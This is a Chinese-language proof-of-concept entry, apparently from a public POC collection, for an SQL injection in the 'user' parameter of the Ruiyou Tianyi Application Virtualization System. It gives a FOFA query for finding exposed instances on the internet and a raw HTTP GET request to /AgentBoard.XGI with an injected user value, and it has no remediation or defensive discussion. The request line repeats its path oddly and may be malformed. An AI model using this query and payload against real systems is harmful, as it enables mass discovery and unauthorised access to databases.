## 天翼应用虚拟化系统sql注入漏洞

天翼应用虚拟化系统 user 参数存在sql注入漏洞

## fofa
```
title="瑞友天翼-应用虚拟化系统" 
```

## poc
```
GET /AgentBoard.XGI?user=/AgentBoard.XGI?user=-1&cmd=UserLogin HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

![image](https://github.com/wy876/POC/assets/139549762/de037448-69f3-4224-a47b-96d64274d0da)
